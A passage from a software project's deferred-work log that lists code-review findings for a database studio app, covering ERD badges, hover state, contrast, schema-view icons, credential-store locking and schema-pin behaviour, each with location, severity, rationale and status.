reason: When a confirm round-trip is in flight (`busy`), Confirm and Cancel both disable to avoid a double-fire, but the type-to-confirm input has no `disabled={busy}`, so it remains editable while the rest of the dialog is frozen. Purely cosmetic (typing changes nothing while the buttons are inert, and the Core is the gate), and on the dormant `objectName` path. Add `disabled={busy}` when the escalated path is wired for real. Deferred.
status: open

### DW-64: The type-to-confirm callback wiring (onConfirm/onCancel threaded through `TypeToConfirmSection`) is structurally unreachable by the presentational test's `findButton` tree-walk, so the escalated-confirm path's button callbacks are untested

origin: review of spec-7-3-redesign-query-confirm-neutral.md, 2026-07-15
source_spec: `spec-7-3-redesign-query-confirm-neutral.md`
location: `src/ui/workspace/ConfirmRun.test.tsx` (`findButton` walks `element.props.children`, which is `undefined` for the unrendered `<TypeToConfirmSection>` child component element)
severity: low
reason: The callback tests invoke `ConfirmRun(...)` directly to get the element tree and walk it for real `onClick` handlers — but in the `objectName` path the buttons live inside the `<TypeToConfirmSection>` child *component element*, which `findButton` cannot render, so those callbacks are never exercised (the static-markup "renders when supplied" assertions DO cover rendering via `renderToStaticMarkup`, just not the wiring). The `objectName` prop is dormant (no caller), so the coverage gap is latent; when a story wires the escalated path it should add a jsdom/testing-library test (or a render-based walk) for the TTC button callbacks. Deferred.
status: open

### DW-65: An ERD column that is BOTH a primary key and a foreign key shows only the PK ink-key badge — its FK-ness gets no per-column blue-link marker (the relationship is still drawn as an edge)

origin: review of spec-7-4-redesign-erd-neutral.md, 2026-07-15
source_spec: `spec-7-4-redesign-erd-neutral.md`
location: `src/ui/workspace/ErdTabView.tsx` (`ErdTableNode` marker ternary `c.isPrimaryKey ? key : c.isForeignKey ? link : spacer`)
severity: low
reason: Join/junction tables commonly have columns that are simultaneously PK and FK (an identifying relationship). The single 13px badge slot renders PK-first, so such a column shows the ink key and no blue link — the column-level FK cue is lost. It is NOT invisible overall: `schemaToGraph` still emits the FK edge, so the relationship is drawn on the canvas and lights up on hover; only the per-column glyph is missing. The prototype's card is a one-badge-per-row layout, so surfacing both would need a combined/dual-badge design decision (out of scope for a presentation-only port). Cosmetic; deferred for a badge-layout decision.
decision: [2026-07-21, user] Show BOTH markers on an ERD column that is PK and FK — the PK key badge PLUS a distinct FK link marker (blue-link glyph) — so a composite PK+FK column reads as both.
status: open

### DW-66: `hoveredNodeId` is never reconciled against the live node set — if the hovered table is removed (and its `tableId` later reused) while the pointer is over it and `onNodeMouseLeave` never fires, a stale id can spuriously highlight a different table's edges

origin: review of spec-7-4-redesign-erd-neutral.md, 2026-07-15
source_spec: `spec-7-4-redesign-erd-neutral.md`
location: `src/ui/workspace/ErdTabView.tsx` (`hoveredNodeId` state; edges `useMemo` deps `[graph.edges, hoveredNodeId]`; no reset effect on `nodes` change)
severity: low
reason: The hover highlight is pure presentation over the derived edges, driven by `onNodeMouseEnter`/`onNodeMouseLeave`. In the narrow case where the exact hovered table is dropped/recreated (via a `tables` change) without a mouseleave, `hoveredNodeId` persists; because node ids are the NUL-joined `schema\0name`, a later table reusing that id would inherit the highlight until the next hover. Very low probability (table create/remove rarely coincides with hovering that same node) and self-correcting on the next pointer move; edge/position derivation and persistence are unaffected. A one-line reconciling effect (`if hoveredNodeId not in nodes → clear`) is the fix; deferred as low-consequence.
status: done 2026-07-22
resolution: already resolved: src/ui/workspace/ErdTabView.tsx:406-415 — an explicit `useEffect` commented "DW-66 reconcile" clears the stale hover: `if (hoveredNodeId !== null && !nodes.some((n) => n.id === hoveredNodeId)) setHoveredNodeId(null)` with deps `[nodes, hoveredNodeId]`. The reconciling effect this entry asked for exists, so a dropped/recreated table can no longer inherit the highlight.

### DW-67: ERD type labels (`text-[10px]`, `--t-text` muted) and the type legend (`text-[10.5px]`, 9px swatches) render sub-11px muted-on-tonal text with no verified contrast in either theme

origin: review of spec-7-4-redesign-erd-neutral.md, 2026-07-15
source_spec: `spec-7-4-redesign-erd-neutral.md`
location: `src/ui/workspace/ErdTabView.tsx` (`ErdTableNode` type label; `ErdLegend`)
severity: low
reason: The tiny muted type labels and legend faithfully reproduce `design-artifacts/erd.html` (the visual source of truth), but sub-11px muted foreground on a tonal `--card`/`--background` surface is a real WCAG legibility risk, and nothing in the tests checks contrast in light or dark. This is an epic-wide neutral-redesign concern (cf. DW-58, the Epic 7 light-theme/contrast work), not specific to the ERD — folded here so the ERD's small-text surfaces are covered when the epic does a contrast/a11y pass.
decision: [2026-07-21, user] Adjust the ERD muted type-label + legend text to a token/size that verifies >=AA contrast in BOTH dark and light themes (minimal change to --t-text/size), checked with a measurement.
status: open

### DW-68: `SchemaTableInfo` carries no table-vs-view discriminator, so the schema tree cannot draw the mockup's distinct view icon — every relation renders with the table icon

origin: review of spec-10-5-multi-root-schema-tree.md, 2026-07-22
source_spec: `spec-10-5-multi-root-schema-tree.md`
location: `src/shared/contract.ts` (`SchemaTableInfo`), `src/core/driver-postgres.ts` / `src/core/driver-mysql.ts` (`listSchema` introspection), `src/ui/schema/SchemaTree.tsx` (`TableIcon`)
severity: low
reason: `epic-10-multi-connection-tree.mockup.html` draws views with their own eye glyph (`.view-ico`, `--t-json`) and its annotations call it out ("`reporting`'s items render with the view icon"), but `SchemaTableInfo` carries only `schema`/`name`/`columns`/`primaryKey`/`indexes`/`foreignKeys` — no `kind`/`isView` — and neither driver's introspection surfaces one, so the distinction is not buildable from the data the UI receives. Story 10.5 is a pure UI consumer of Story 10.4's contract and its own intent-contract puts the discriminator explicitly out of scope, so all relations render with the table icon (no regression — the pre-10.5 tree did the same). The fix is a small vertical slice — add `kind: "table" | "view"` to `SchemaTableInfo`, surface it from the pg (`pg_class.relkind`) and MySQL (`information_schema.tables.table_type`) queries, then branch the tree's icon — but it touches the shared contract and both drivers, which is a Ring-1 change a UI story must not make unilaterally.
status: open
- source_spec: `_bmad-output/implementation-artifacts/spec-7-5-redesign-chat-neutral.md`
  summary: The assistant action row renders open-in-editor / thumbs / share / regenerate / more as focusable buttons with action `aria-label`s but no behavior — they announce functionality they don't perform (an a11y/UX smell), an epic-wide decision to either wire them in a later behavioral story or mark them disabled.
  evidence: Spec 7.5 is presentation-only and its Design Notes intentionally ship these as visual affordances (only `copy` is wired); both adversarial reviewers flagged the dead controls. Real but non-blocking, and consistent with the epic's deferred a11y items (cf. DW-58/67).
- source_spec: `_bmad-output/implementation-artifacts/spec-7-6-redesign-report-neutral.md`
  summary: The Report chart's multi-series palette is only partly theme-aware and its lead hue now collides with the second series — `SERIES_COLORS[0]` became `var(--rpt-chart)` (blue, `#82aaff` dark / `#2f6fd6` light, theme-adaptive) but entries 1..5 stay hardcoded hex (`#5eb0ef`, `#7bd88f`, `#e6c86e`, `#c78bd8`, `#e08a6b`) that neither flip for light nor separate in hue from the blue lead (lead `#82aaff` sits next to `#5eb0ef`, two adjacent blues).
  evidence: `src/ui/report/ReportChart.tsx:34-41`. Two real, pre-existing-adjacent issues surfaced by both reviewers: (a) series 2..N are fixed hex tuned for dark, so under `data-theme="light"` a pale swatch like `#e6c86e` has weak contrast on white while only the lead adapts; (b) the two most-common series (0 and 1) are now similar blues, reducing discriminability the old coral lead gave. Story 7.6's contract explicitly mandated `series[0]=--rpt-chart` and "keep the existing distinct palette" for the rest, so this is a design-tension deferred for a later dataviz/theme pass (make the whole series palette token-driven + theme-aware, and pick a series[1] hue that separates from the blue lead). Single-series charts (the common report case) are unaffected. Cosmetic, non-blocking.
- source_spec: `_bmad-output/implementation-artifacts/spec-7-7-redesign-settings-neutral.md`
  summary: The destructive remove-confirm "yes" button (solid `bg-err` fill + `text-white`) is ~3:1 contrast in the dark theme — below WCAG AA for normal text — after the neutral port swapped the darker `bg-red-600` (~4.8:1) for the softer `--err` (#ef6a63); the most dangerous action now has the weakest legibility.
  evidence: `src/ui/settings/SettingsPanel.tsx` (ConnectionRow remove-confirm "yes"). Both adversarial reviewers independently flagged it. The story's intent-contract explicitly sanctions white-on-red as functional color, and a proper fix (a darker destructive-red token, or an on-err foreground token analogous to `--coral-ink`) belongs in `globals.css`, which this presentation-only story is contract-forbidden to edit. Epic-wide neutral-palette/contrast concern (cf. DW-58/67); non-blocking — the "yes" label still reads and the action is behind a two-step confirm.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-7-rpc-request-body-guard.md`
  summary: `Bun.serve` at `src/core/server.ts:410` does not set `maxRequestBodySize`, so the ~128 MB backstop the DW-7 body-guard spec explicitly leans on (for the omitted/undercounted/chunked Content-Length class it declares out-of-scope) is Bun's version-dependent default, not a deliberately chosen value — and it is ~16× larger than the 8 MiB guard itself.
  evidence: Verified: no `maxRequestBodySize` key exists in the `Bun.serve({…})` options at `src/core/server.ts:410`, so a caller that omits/undercounts `content-length` (or uses chunked `Transfer-Encoding`) sails past the 8 MiB `overBodyLimit` guard and is only stopped at Bun's default (~128 MB). Pre-existing config gap (the endpoints predate DW-7) surfaced by the follow-up review; out of DW-7's Content-Length-header-only scope ("do not stream-count body bytes or re-architect body reading"). Low consequence for a localhost single-user tool (self-DoS only), but pinning `maxRequestBodySize` to an explicit value would make the spec's stated backstop real and version-stable rather than an implicit framework default.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-14-credential-store-single-writer.md`
  summary: On a filesystem without hard-link support (`EXDEV`/`EMLINK`/`ENOSYS`/`EPERM`), the store-lock atomic create falls back to `openSync(path,"wx")` + a separate `writeFileSync`, reopening the empty-lock-body window the primary `linkSync` path was patched to close — a concurrent acquirer can read the empty body as malformed-stale and reclaim a live in-progress lock (double-acquire / lost update), and symmetrically a `release` that reads a `null` (empty) body falls through to delete another handle's live lock.
  evidence: `src/core/store-lock.ts` — `createExclusive` link-hostile fallback (`openSync("wx")` then a separate `writeFileSync`) and `makeRelease` (a `null` lockInfo is treated as "ours to clear" and removed). Both adversarial reviewers independently flagged it (Blind Hunter H1, Edge Case Hunter EC-1/EC-5). The spec documents this fallback window as an accepted residual risk ("the app dir is normally local disk"), so the shipped change is internally consistent, but the exact lost-update DW-14 exists to prevent is reachable on shared network volumes / cross-device container mounts — precisely where two live instances are most plausible. Needs a focused design decision: harden the link-hostile create (e.g. disambiguate a zero-byte in-progress lock from a truly-malformed one before reclaiming/removing) or explicitly drop link-hostile filesystems as a supported single-writer target. Local-disk installs use the atomic `linkSync` path and are unaffected.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-14-credential-store-single-writer.md`
  summary: The new `locked` open outcome — the whole user-visible payoff of the single-writer guarantee — is flattened to a generic `internal_error` ("credential store is unavailable") by `connectionRegistry.obtain()`'s catch-all, so a user who launches a second instance is never told "another instance is already running" and, because open is lazy, only meets the mislabeled error when they first touch the connections surface.
  evidence: `src/core/connection-registry.ts` — `obtain()` maps every non-`opened` arm, including the new `locked`, to `{ code: "internal_error", detail: outcome }`; the `locked` distinction plumbed through `OpenResult` in `credential-store.ts` dies at that boundary. Flagged by Blind Hunter (H5). The spec's Code Map intentionally scopes recovery/surface UX out of the single-writer core (consistent with the prior pass's deferred foreign-host-hint UX), so this is a consciously-deferred product-surface gap, not a spec deviation — recorded for a focused follow-up to surface `locked` distinctly (a typed "already running" signal plus a recovery hint) in the product.
- source_spec: `_bmad-output/implementation-artifacts/spec-8-1-shadcn-ui-foundation.md`
  summary: The Story 8.1 `Select` foundation ships without `SelectScrollUpButton`/`SelectScrollDownButton`, so a `SelectContent` whose option list overflows the popper viewport loses the visible up/down scroll-affordance chevrons canonical shadcn provides (Radix still scrolls the Viewport via wheel/keyboard, so it is an affordance gap, not a hard break).
  evidence: `src/ui/components/ui/select.tsx` exports exactly the eight parts the spec Code Map enumerated (Select…SelectSeparator) — no scroll buttons — so the shipped foundation is spec-compliant, not a deviation. The Select's real consumer (Story 8.6 settings pickers) and any long list would benefit from the standard shadcn scroll buttons; add `SelectScrollUpButton`/`SelectScrollDownButton` when the Select is wired into a surface. Low consequence: the component ships unused in 8.1 and Radix keeps the viewport scrollable regardless. Flagged independently by both adversarial reviewers.
- source_spec: `_bmad-output/implementation-artifacts/spec-8-1-shadcn-ui-foundation.md`
  summary: The Story 8.1 primitives suppress the native focus outline (`focus-visible:outline-none`) and render their focus indicator purely as a Tailwind `ring-*` (box-shadow), which is not painted under `forced-colors`/Windows high-contrast mode — so keyboard users in those modes can lose the visible focus indicator on Button/SelectTrigger/Dialog-close.
  evidence: `src/ui/components/ui/{button,select,dialog}.tsx` — each primitive pairs `focus-visible:outline-none` with a `focus-visible:ring-2 focus-visible:ring-coral` box-shadow ring; box-shadows are dropped under forced-colors, and the `outline-none` also removes the global `:focus-visible` ink outline (`globals.css`) on focus. The `focus-visible:outline-none` pattern is spec-directed (the Code Map specifies it for Button), so this is a foundation-wide design choice, not a per-file defect; a robust fix (a `forced-colors:` outline fallback, or keeping the outline additive to the ring) is an accessibility polish to apply across the primitive set. Low severity: narrow user segment, ring is visible in normal-contrast modes.
- source_spec: `_bmad-output/implementation-artifacts/spec-8-2-chrome-tabs-fidelity.md`
  summary: The tab strip lost its only horizontal-overflow mechanism — Story 8.2 changed the tablist from `overflow-x-auto` to `overflow-visible` (mandatory so the active tab's concave feet + the 1px panel fusion are never clipped), but tabs stay `shrink-0` with no replacement scroller/truncation/overflow-menu, so once open tabs exceed the strip width they spill past the `min-w-0 flex-1` wrapper over the `+` button and the panel's right edge with no way to reach them.
  evidence: `src/ui/workspace/TabBar.tsx:68` (`overflow-visible` + `shrink-0` tabs) inside `Workspace.tsx:326`'s `min-w-0 flex-1` wrapper; both adversarial reviewers (Blind Hunter, Edge Case Hunter) flagged it. Not a spec deviation: the story's dominant mandate — feet never clipped, and the `design-artifacts/*.html` prototype (which itself uses `overflow:visible` with no scroll) is THE contract and supersedes — precludes an in-box horizontal scroller, since pairing `overflow-x:auto` with a short vertical box is exactly the Story-7.1 trap that re-clips the feet + spawns a phantom vertical scrollbar. The "scrolls horizontally" wording in the many-tabs AC is thus unachievable together with the feet and is an accepted tradeoff. Real UX limitation at tab scale (quick-studio tabs are DB objects, so many-tab sessions are plausible); needs a dedicated overflow-affordance design in a later story — an isolated horizontal scroller whose vertical axis stays visible (negative-margin / clip-path that doesn't cut the feet), a tab-overflow dropdown, or letting inactive tabs shrink + truncate. The common few-tab case is unaffected.
- source_spec: `_bmad-output/implementation-artifacts/spec-8-4-chat-markdown-rendering.md`
  summary: Assistant answers containing a GFM Markdown table (a common shape for schema Q&A) render as collapsed literal pipe text rather than a real `<table>`, because the reused `renderReportMarkdown` uses micromark CORE only (no `micromark-extension-gfm`), so table/strikethrough/task-list/bare-autolink syntax is not parsed; with `whitespace-pre-wrap` now gone, the table's soft-wrapped rows also collapse onto one line.
  evidence: `src/ui/report/report-markdown.ts` calls `micromark(md, { allowDangerousHtml: false })` with no GFM extensions (`package.json` pins `micromark ^4.0.2`, no gfm extension); both adversarial reviewers (Blind Hunter, Edge Case Hunter) flagged tables as the single most-probable ugly output for DB answers. NOT a spec deviation: Story 8.4's Block-If (b) explicitly forbids adding any Markdown/highlighter dependency beyond the present micromark, and `renderReportMarkdown` is the SHARED report+chat renderer, so enabling GFM is a cross-cutting decision (it would also change every report). Deferred for a focused follow-up: decide whether to add `micromark-extension-gfm-table` (+ a `.chat-md table` / `.report-prose table` neutral style) to the shared renderer so both chat and report gain tables, strikethrough, and task lists together. The `report` surface has carried this same limitation since Epic 5 with no complaint, so consequence is medium-at-most.
- source_spec: `_bmad-output/implementation-artifacts/spec-8-7-surface-active-connection.md`
  summary: The "active connection" entry only surfaces the in-memory EPHEMERAL boot target; in Persistent mode, where per-target browsing is resolved per-request via separate connection managers (Story 6.2 `createConnectionTargets`), the panel shows nothing (`connection: null`) even while a saved DB is actively being browsed — so a persistent user gets no "what am I looking at" read-only view.
  evidence: `src/core/server.ts` wires `activeConnection` to the boot `connectionManager.describe()` only; `src/core/connection-targets.ts` (`createConnectionTargets`) resolves distinct managers per saved-connection `connectionId` that the boot manager never sees, and Core has no session-global "current target" concept. Flagged by Blind Hunter (F1). NOT a spec deviation — Story 8.7's intent-contract is explicitly scoped to the ephemeral in-memory target (the original user complaint was an ephemeral positional-arg launch), and its I/O matrix defines "Persistent boot, no ephemeral url → connection:null, no active entry" as the CORRECT behavior. A later story could introduce a session-global active-target signal (updated on each per-target browse) and refresh the panel on change (Blind Hunter F2: the current load is once-on-mount, fine for the immutable ephemeral target but stale if a mutable persistent target were surfaced). Medium-at-most; the reported bug (ephemeral) is fully fixed.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-11-macos-keychain-ci-validation.md`
  summary: The keyring-spike CI legs cannot mechanically confirm the throw-path (not-found) error-shape classification that `docs/keyring-spike-decision.md` names as a hard gate for committing Windows/macOS to the keychain path — the compiled-binary check only does store→found→delete (never reads a missing key, so `errSecItemNotFound`/the Windows NoEntry shape is never produced), and the smoke's not-found test accepts BOTH `not-found` and `unavailable`, so a misclassification stays green.
  evidence: `scripts/keyring-native-check.ts` performs only a store→found→delete round-trip and never issues a get on an absent key; `src/core/keychain.test.ts` (~L93-102) asserts the not-found path accepts either `not-found` or `unavailable`, so the locale-fragile `isNotFoundError` substring heuristic (`src/core/keychain.ts`, `NOT_FOUND_MARKERS` — which has no marker for macOS's "could not be found" wording) is never adversarially exercised by a green leg. Surfaced by the DW-11 follow-up review (both adversarial reviewers, independently). Pre-existing and platform-general — the decision-record's "confirm the throw-path classification against the observed error shape" gate applies identically to the pre-DW-11 Windows leg — so NOT caused by DW-11, which only extended the same framing to macOS and is contract-forbidden from touching `keychain.ts` or the smoke. Real gap to close alongside the already-tracked DW-10 typed-error-classification work: the spike as designed proves a round-trip but does NOT produce or assert the not-found error shape, so a human must not read a green Windows/macOS leg as having confirmed the classification. Fix candidates: add a not-found probe (get on an unstored key) to the compiled-binary check and assert the typed classification, or tighten the smoke's not-found assertion once typed error codes land.
- source_spec: `_bmad-output/implementation-artifacts/spec-9-4-create-table-tab.md`
  summary: The in-progress create-table draft (table name + column rows) is discarded when the user switches to another tab and back, because CreateTablePanel holds its draft in local `useState` and TabContent mounts only the active tab body, so switching away unmounts the panel and it remounts fresh — unlike the sibling session-only surfaces (query/chat/report) whose drafts are lifted to App-held per-tab maps and survive switches.
  evidence: `src/ui/schema/CreateTablePanel.tsx` (draft in local state) + `src/ui/workspace/TabContent.tsx:596` (only the active tab's body renders); both adversarial reviewers (Blind Hunter F2, Edge Case Hunter #2) flagged it independently. NOT a spec deviation and NOT a regression: Story 9.4's intent-contract mandates a pure RELOCATION of CreateTablePanel ("preserve VERBATIM", "Never change the panel's internals") — lifting the draft to App-held state would make the panel controlled and thus violate that constraint, so it is deliberately out of scope here; and the pre-9.4 overlay HID the tab strip while open (`!createOpen` gate), so the user could not switch away at all and closing discarded the draft anyway — the new tab model is strictly a capability gain. The misleading "draft preserved (same mounted panel)" comments were corrected in this pass (patch); the behavior itself needs a dedicated follow-up: lift the create-table draft into App-held per-tab state (mirroring `queryDrafts`/`chatStates`/`reportStates`) and thread it through TabContent so it survives switch-away — which requires making CreateTablePanel accept a controlled draft, a change this story's contract forbids. Secondary: an in-flight create RPC that errors after switch-away calls `setError` on an unmounted panel (swallowed) — same root cause, resolved by the same lift. Low-to-medium consequence: only affects the newly-enabled switch-away path with a half-filled form.
- source_spec: `_bmad-output/implementation-artifacts/spec-9-4-create-table-tab.md`
  summary: Opening the transient create-table tab dirties the persisted workspace snapshot (a spurious `workspace.save` fires and the persisted `nextId` advances by one per open, leaving a permanent id gap) even though the tab itself is filtered out and never reaches disk — mildly at odds with the spec's "React-memory-only, never-persist, no gratuitous writes" framing for this surface.
  evidence: `openOrFocusCreateTable` (`src/ui/workspace/workspace-state.ts:206-211`) consumes an id and bumps `nextId`, and it makes the create-table tab the active tab. `toWorkspaceSnapshot` (`workspace-state.ts:375-401`) drops the tab and reconciles `activeTabId`, but carries `nextId: state.nextId` verbatim and reconciles `activeTabId` to `persistedTabs[0]` — both differ from the pre-open snapshot, so the debounced autosave (`src/ui/App.tsx:482-488`, which compares `JSON.stringify` against `lastPersistedRef`) fires a real `workspace.save`. Both adversarial reviewers (Blind Hunter #1, Edge Case Hunter #1) converged on this independently, citing the codebase's own no-resave invariant comments (`workspace-state.ts:369-370`, `App.tsx:474-475`). Deferred, not patched, because: (a) LOW consequence — the snapshot stays valid, `nextId` is a legitimately monotonic never-reused counter, and `restoreWorkspace`'s `Math.max(nextId, maxId+1)` keeps reload safe; (b) the dominant dirtying is the `activeTabId → first-surviving-tab` reconciliation, which the intent-contract's I/O matrix (line 71: "activeTabId restores to a surviving tab (or the first)") EXPLICITLY sanctions, so a save-on-open (and the corresponding on-reload focus shift to the first tab) is a designed consequence, not a spec omission; (c) a `nextId`-only reclaim (emit `persistedMaxId+1` when the dropped create-table id is the trailing id) would close only the id gap, not the save (which still fires from the sanctioned `activeTabId` delta), and must carefully avoid reusing a since-closed document tab's id — added complexity for a cosmetic non-bug. Fix candidate for a dedicated pass: keep create-table out of `activeTabId`/`nextId` persistence accounting (e.g. reconcile `activeTabId` toward the pre-open active tab rather than `persistedTabs[0]`, and reclaim the create-table id in the snapshot) so opening the transient surface produces a byte-identical snapshot and no write.
- source_spec: `_bmad-output/implementation-artifacts/spec-9-5-erd-hover-detail.md`
  summary: The Story 9.5 ERD hover detail panel caps at `max-h-[70vh] overflow-auto` but is unreachable-to-scroll — it is a `top-left` React Flow `<Panel>` mounted only while `hoveredNodeId !== null`, and moving the pointer toward it leaves the node (`onNodeMouseLeave` → `hoveredNodeId = null` → the panel unmounts), so on a table wider than ~30 columns the overflowed lower rows can never be read in the panel.
  evidence: `src/ui/workspace/ErdTabView.tsx` (`ErdHoverPanel` container `max-h-[70vh] overflow-auto`; `<Panel position="top-left">` gated on `hoveredNodeId !== null`; hover driven by `onNodeMouseEnter`/`onNodeMouseLeave` on the node). Flagged by Blind Hunter. NOT a spec deviation — the intent-contract mandates a hover-gated, ephemeral, presentation-only panel with no new pointer/interaction machinery, and the full column list remains available in the node card itself (the panel is a convenience readout), so nothing is truly inaccessible. Needs a focused interaction-design decision a presentation-only story cannot make unattended: pin/anchor the panel open while the pointer is over node OR panel (add `nowheel`/`nopan` so wheel scrolls the list instead of zooming the canvas — the latent wheel-zoom conflict Blind Hunter also noted), OR truncate with a "+N more" affordance, OR accept the cap and drop the misleading `overflow-auto`. Low-to-medium consequence: only wide-table hovers, and the node card is the fallback.
- source_spec: `_bmad-output/implementation-artifacts/spec-9-5-erd-hover-detail.md`
  summary: The Story 9.5 hover detail panel — which newly surfaces substantive information (column names, data types, PK/FK badges) — is reachable only via mouse hover (`onNodeMouseEnter`/`Leave`), with no keyboard/focus trigger and no `role`/live-region on `ErdHoverPanel`, so keyboard and screen-reader users cannot obtain the column detail the panel exposes.
  evidence: `src/ui/workspace/ErdTabView.tsx` (`ErdHoverPanel` renders a plain `<div>` with no ARIA role/live-region; the only hover triggers are `onNodeMouseEnter`/`onNodeMouseLeave`; no node focus/selection path feeds the panel). Flagged by Blind Hunter. NOT a spec deviation — the intent-contract does not require keyboard access and the pre-existing edge-recolor hover was already mouse-only — but attaching real, otherwise-illegible-at-fit-zoom column detail to a mouse-only gesture is an accessibility gap that widens as the ERD becomes more informative. A proper fix (expose the same detail via node focus/selection or a keyboard-navigable list, with an appropriate ARIA role/live-region) is a dedicated accessibility feature beyond this presentation-only story's scope. Medium-for-affected-users; the schema itself remains fully available in the (also mouse-oriented but zoomable) node cards and the Schema tree.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-52-live-report-connection-reload.md`
  summary: The Live Report Core-down inline note is routed through `slot.appendError`, which prefixes "block failed: ", so a viewer whose Core is unreachable sees "block failed: cannot reach quick-studio — re-query when it is running" — mislabeling an infra-down Core as a per-block query failure.
  evidence: `src/live-report/runtime.ts` failure path calls `slot.appendError(CANNOT_REACH_BLOCK_NOTE)` and the DOM host's `appendError` (in `makeDomHost`) prepends "block failed: "; both adversarial reviewers (Blind Hunter, Edge Case Hunter) flagged it independently. Pre-existing, NOT caused by DW-52 — the "block failed: " prefix and the failure-path `appendError(CANNOT_REACH_BLOCK_NOTE)` call both predate this change; the re-entrant refactor keeps routing the note through `appendError` (now on both initial-load and Refresh failure paths). Cosmetic copy issue; a durable fix is a note-vs-error variant on the block slot (or a dedicated infra-down affordance) so the inline note is not prefixed as a block failure — a small UX/contract decision out of DW-52's re-entrancy scope.
- source_spec: `_bmad-output/implementation-artifacts/spec-dw-52-live-report-connection-reload.md`
  summary: `loadConnections` maps an `ok`-but-non-array `connections.list` result to `[]` (a "success"), so on recovery `runAll` clears the banner and reconciles a held named pick to Default — a transiently empty or malformed list silently drops the viewer's pick and masks a Core contract violation as a normal Default run.
  evidence: `src/live-report/runtime.ts` `loadConnections` non-array→`[]` fallback (pre-existing) feeds `runAll`'s new success-path reconciliation `if (current !== null && !loaded.some((c) => c.id === current)) current = null`; both adversarial reviewers flagged the interaction (Blind Hunter finding 2, Edge Case Hunter E3). For a genuinely-deleted connection the reset is correct and spec-mandated (Design Notes), but the malformed/transient-empty case is indistinguishable from a real deletion, so a flapping/garbled Core can reset a still-valid named pick to Default with no banner. Pre-existing root (the `[]` coercion in `loadConnections`, unchanged by DW-52); surfaced incidentally now that reconciliation runs on every load. The durable fix is to have `loadConnections` distinguish a malformed non-array reply from a real empty list (and skip reconciliation / surface a distinct signal in that case), a taxonomy decision beyond DW-52's scope.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
  summary: A pinned schema that does not exist on the server (typo, wrong case — Postgres folds unquoted identifiers to lowercase but the pin is matched exactly, or a name the role cannot read) yields an EMPTY catalog that is indistinguishable from an empty database: no warning, no count, no dedicated failure kind anywhere in the stack.
  evidence: `src/core/driver-postgres.ts` / `src/core/driver-mysql.ts` apply the pin as an exact `table_schema = $n` / `= ?` predicate with no existence probe; `checkSchema` (`src/core/connection-registry.ts`) deliberately does not validate against the live database; `ConnectionFailureKind` (`src/shared/contract.ts`) has no `schema-not-found` member and `NEUTRAL_MESSAGE` (`src/core/driver.ts`) has no entry for one; the Settings schema input hardcodes `invalid={false}`. Both adversarial reviewers converged on this independently (Blind Hunter, Edge Case Hunter #1/#2). NOT a spec deviation and NOT a defect in this change: Story 10.2's intent-contract I/O matrix states the rule explicitly — "An unknown/nonexistent schema simply yields zero tables (same as today's behavior for an empty result) — not an error" — so a silent empty result is the contracted behavior, and the contract also forbids validating the pin against the live database in this story. Real follow-up work all the same, and it lands naturally with Epic 10's per-root error rendering: probe `information_schema.schemata` / `pg_namespace` on introspection (or count the pinned scope's tables) and surface a distinct classified outcome the multi-root tree can render on the affected root ("pinned schema not found / not visible to this role") instead of a calm-but-wrong empty tree. Medium consequence: only affects a connection the user deliberately pinned, and clearing the pin fully recovers.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
  summary: `src/ui/settings/SettingsPanel.tsx` has no component test file at all, so the connections panel's genuinely behavioral rules — the add form omitting a blank schema, the edit form pre-filling the pin from the summary, the mutation gates (`busy`/`loading`/`listLoaded`), and the remove-confirm flow — are asserted nowhere at the component level.
  evidence: `src/ui/settings/` contains `connections-model.test.ts`, `providers-model.test.ts`, and `ProvidersPanel.test.tsx` — but no `SettingsPanel.test.tsx`; `src/core/rpc.test.ts` covers only the dispatch side. Flagged by Blind Hunter. Pre-existing, NOT caused by Story 10.2 — the panel has been untested since Story 2.4 and this change only added two `<Field>`s to it. The most consequential new decision (the edit patch shape) was mitigated in this pass by extracting it into a pure exported helper in `connections-model.ts` covered by the existing pure test file, so the untested surface is now markup + wiring only. A dedicated pass should stand up the first `SettingsPanel.test.tsx` using `ProvidersPanel.test.tsx` as the pattern (implicit `<label>` association means `getByLabelText` is the query to use — the inputs carry no `id`/`data-testid`). Low-to-medium: real coverage debt, no known live defect.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
  summary: The pinned schema scopes INTROSPECTION only — nothing sets Postgres `search_path` or issues a MySQL `USE` — so on a pinned connection the tree/ERD show `reporting.users` while an unqualified `SELECT * FROM users` typed in the SQL editor still resolves against the session's default schema (`public` / the URL's database): the same connection resolves names two different ways depending on the surface.
  evidence: `src/core/driver-postgres.ts` / `src/core/driver-mysql.ts` apply the pin only inside `listSchema`'s introspection queries; neither `connect()` nor the query paths touch `search_path`/`USE`. Executor-GENERATED DML is safe — `qualified()` (`src/core/executor.ts`) schema-qualifies every identifier it emits — so this affects hand-written editor SQL only. Flagged by Blind Hunter. NOT a spec deviation: Story 10.2 is titled and scoped "applied in-query at introspection", and its contract's Never list forbids widening the pin beyond a bound scalar in the introspection predicates; changing session-level name resolution is a materially larger semantic change (it would alter how every ad-hoc query behaves, including ones written before the pin existed) that needs its own decision. Follow-up candidate: either set the session default to the pin on connect so both surfaces agree, or surface the divergence in the editor (e.g. the pin badge on the connection root explaining that unqualified names still resolve to the connection default). Medium consequence on writes against a pinned connection; low on reads.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
  summary: Once read paths are resolved per-connection (Story 10.4), a pinned schema will make row update/delete fail for any table outside the pin with a misleading "requires a single-column primary key" error, because `resolveSinglePkTable` looks the target table up in the live introspected schema.
  evidence: `src/core/executor.ts:645-666` resolves the update/delete target by scanning `live.tables` from `seams.getSchema()`; a table filtered out of introspection is indistinguishable from a table with no usable PK, so the user gets a PK error for a table that has one. NOT reachable today: `server.ts:358` wires `getSchema` to the BOOT manager, which R4 deliberately left unpinned, so the executor never sees a narrowed catalog. It becomes reachable the moment Story 10.4 routes the executor through the per-target manager. Flagged by Blind Hunter. Follow-up candidate for 10.4: either resolve the PK target through an unscoped catalog lookup, or classify "table outside the connection's pinned schema" as its own failure kind so the message names the real cause.
- source_spec: `_bmad-output/implementation-artifacts/spec-10-2-per-connection-schema-scope.md`
